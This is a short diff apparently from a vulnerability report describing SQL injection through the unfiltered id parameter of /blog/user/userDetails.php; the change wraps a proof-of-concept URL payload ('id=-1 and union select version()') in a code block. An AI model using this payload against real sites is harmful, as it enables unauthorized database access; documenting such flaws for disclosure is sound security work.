@@ -19,6 +19,7 @@ the Vulnerability in /blog/user/userDetails.php allows SQL Injection via the id 
 	?>
 $id has not been filtered to cause injection
 
-##payload
-
+##payload##
+```
 http://target/user/userDetails.php?id=-1 and union select version()
+```
